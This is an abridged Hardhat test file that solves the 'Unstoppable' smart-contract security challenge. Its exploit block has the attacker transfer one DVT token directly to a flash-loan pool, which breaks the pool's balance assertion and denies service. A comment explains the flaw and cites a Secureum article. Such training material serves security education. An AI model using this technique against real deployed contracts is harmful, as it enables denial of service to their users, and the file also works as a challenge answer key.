...
describe("[Challenge] Unstoppable", function () {
  ...
  it("Exploit", async function () {
    ...
    /*
    Becouse of 1 DVT transfer to pool it will fail when it will check => assert(poolBalance == balanceBefore);
    Read 28th Pitfall of secuream
    https://secureum.substack.com/p/security-pitfalls-and-best-practices-101 
    */

    await this.token
      .connect(attacker)
      .transfer(this.pool.address, ethers.utils.parseEther("1"));
  });
